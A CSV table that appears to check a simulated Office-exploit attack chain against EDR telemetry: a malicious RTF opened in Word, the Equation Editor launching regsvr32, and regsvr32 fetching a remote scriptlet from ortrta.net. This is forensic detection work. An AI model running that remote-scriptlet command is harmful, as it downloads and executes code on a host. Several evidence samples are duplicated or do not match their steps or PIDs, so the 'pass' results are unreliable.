chain_id,step_id,order,subject,action,object,evidence_basis,search_window_start_utc,search_window_end_utc,terms,status,best_table,best_count,cbc_alert_hits,cbc_event_hits,sysmon_hits,stage3_status,stage3_best_table,stage3_best_count,sample,stage3_sample
s3_attack_01_document_open_anchor,S3-01-S01,1,explorer.exe (PID 1604),started,WINWORD.EXE (PID 5592),Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe; explorer.exe,pass,cbc_events,520,1,520,0,pass,cbc_events,520,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_01_document_open_anchor,S3-01-S02,2,WINWORD.EXE (PID 5592),ran with document path in command line,C:\Users\aalsahee\Downloads\s3take2\msf.rtf,Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe,pass,cbc_events,590,2,590,6,pass,cbc_events,590,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_01_document_open_anchor,S3-01-S03,3,WINWORD.EXE (PID 5592),created,C:\Users\aalsahee\Downloads\s3take2\~$msf.rtf,Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe,pass,cbc_events,590,2,590,6,pass,cbc_events,590,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_02_word_temp_rtf_context,S3-02-S01,1,WINWORD.EXE (PID 5592),opened/read,C:\Users\aalsahee\Downloads\s3take2\msf.rtf,Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe,pass,cbc_events,590,2,590,6,pass,cbc_events,590,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_02_word_temp_rtf_context,S3-02-S02,2,WINWORD.EXE (PID 5592),created,C:\Users\aalsahee\AppData\Local\Temp\oice_*\c586a0f0.rtf,Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe,pass,cbc_events,590,2,590,6,pass,cbc_events,590,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_02_word_temp_rtf_context,S3-02-S03,3,WINWORD.EXE (PID 5592),deleted,C:\Users\aalsahee\AppData\Local\Temp\oice_*\c586a0f0.rtf,Canonical CBC EDR event row,2022-07-19T14:27:30Z,2022-07-19T14:42:30Z,winword.exe,pass,cbc_events,590,2,590,6,pass,cbc_events,590,"{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 9805, ""timestamp_utc"": ""2022-07-19T14:33:17.7968937Z"", ""backend_timestamp_utc"": ""2022-07-19T14:33:26Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.moduleload"", ""action"": ""ACTION_LOAD_MODULE"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\explorer.exe"", ""process_pid"": 1604, ""parent_path"": null, ""parent_pid"": null, ""process_cmdline"": ""C:\\Windows\\Explorer.EXE"", ""parent_cmdline"": null, ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Image"", ""object_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": null, ""childproc_pid"": null, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": ""c:\\program files\\microsoft office\\office14\\winword.exe"", ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_03_eqnedt32_regsvr32_remote_sct,S3-03-S01,1,svchost.exe / DcomLaunch (PID 648),started,EQNEDT32.EXE (PID 6032),Canonical CBC EDR event row,2022-07-19T14:26:00Z,2022-07-19T14:41:00Z,eqnedt32.exe; svchost.exe,pass,cbc_events,171,0,171,0,pass,cbc_events,171,"{""id"": 7814, ""timestamp_utc"": ""2022-07-19T14:33:24.0572518Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\svchost.exe"", ""process_pid"": 648, ""parent_path"": ""c:\\windows\\system32\\services.exe"", ""parent_pid"": 484, ""process_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""parent_cmdline"": ""C:\\Windows\\system32\\services.exe"", ""process_username"": ""NT AUTHORITY\\SYSTEM"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""childproc_pid"": 6032, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 7814, ""timestamp_utc"": ""2022-07-19T14:33:24.0572518Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\windows\\system32\\svchost.exe"", ""process_pid"": 648, ""parent_path"": ""c:\\windows\\system32\\services.exe"", ""parent_pid"": 484, ""process_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""parent_cmdline"": ""C:\\Windows\\system32\\services.exe"", ""process_username"": ""NT AUTHORITY\\SYSTEM"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""childproc_pid"": 6032, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_03_eqnedt32_regsvr32_remote_sct,S3-03-S02,2,EQNEDT32.EXE (PID 6032),started,regsvr32.exe (PID 6124),Canonical CBC EDR event row,2022-07-19T14:26:00Z,2022-07-19T14:41:00Z,eqnedt32.exe; regsvr32.exe,pass,cbc_events,133,3,133,2,pass,cbc_events,133,"{""id"": 7829, ""timestamp_utc"": ""2022-07-19T14:33:24.1972598Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""process_pid"": 6032, ""parent_path"": ""c:\\windows\\system32\\svchost.exe"", ""parent_pid"": 648, ""process_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""parent_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""childproc_pid"": 6124, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 7829, ""timestamp_utc"": ""2022-07-19T14:33:24.1972598Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""process_pid"": 6032, ""parent_path"": ""c:\\windows\\system32\\svchost.exe"", ""parent_pid"": 648, ""process_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""parent_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""childproc_pid"": 6124, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
s3_attack_03_eqnedt32_regsvr32_remote_sct,S3-03-S03,3,regsvr32.exe (PID 6124),connected using remote SCT command,ortrta.net / 10.193.66.115:8080; /i:http://ortrta.net:8080/sF5riGj4K26DK.sct,Canonical CBC EDR event row,2022-07-19T14:26:00Z,2022-07-19T14:41:00Z,eqnedt32.exe; regsvr32.exe; 10.193.66.115:8080,fail,,0,0,0,0,unsupported_after_alert_summary_removal,,0,,
s3_attack_04_regsvr32_hidden_powershell,S3-04-S01,1,EQNEDT32.EXE (PID 2244),started,regsvr32.exe (PID 3992),Canonical CBC EDR event row,2022-07-19T14:30:00Z,2022-07-19T14:45:00Z,regsvr32.exe; eqnedt32.exe,pass,cbc_events,133,7,133,2,pass,cbc_events,133,"{""id"": 7829, ""timestamp_utc"": ""2022-07-19T14:33:24.1972598Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""process_pid"": 6032, ""parent_path"": ""c:\\windows\\system32\\svchost.exe"", ""parent_pid"": 648, ""process_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""parent_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""childproc_pid"": 6124, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}","{""id"": 7829, ""timestamp_utc"": ""2022-07-19T14:33:24.1972598Z"", ""backend_timestamp_utc"": ""2022-07-19T14:35:30Z"", ""stream_name"": ""cbc-edr"", ""event_id"": null, ""type"": ""endpoint.event.procstart"", ""action"": ""ACTION_CREATE_PROCESS"", ""device_name"": ""WIN-32-H1"", ""process_path"": ""c:\\program files\\common files\\microsoft shared\\equation\\eqnedt32.exe"", ""process_pid"": 6032, ""parent_path"": ""c:\\windows\\system32\\svchost.exe"", ""parent_pid"": 648, ""process_cmdline"": ""\""C:\\Program Files\\Common Files\\Microsoft Shared\\EQUATION\\EQNEDT32.EXE\"" -Embedding"", ""parent_cmdline"": ""C:\\Windows\\system32\\svchost.exe -k DcomLaunch"", ""process_username"": ""WIN-32-H1\\aalsahee"", ""sensor_action"": ""ACTION_ALLOW"", ""event_origin"": ""EDR"", ""object_type"": ""Process"", ""object_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""remote_ip"": null, ""remote_port"": null, ""local_ip"": null, ""local_port"": null, ""netconn_domain"": null, ""childproc_name"": ""c:\\windows\\system32\\regsvr32.exe"", ""childproc_pid"": 6124, ""filemod_name"": null, ""regmod_name"": null, ""modload_name"": null, ""crossproc_name"": null, ""crossproc_api"": null, ""raw_json"": null, ""_match_mode"": ""all_terms""}"
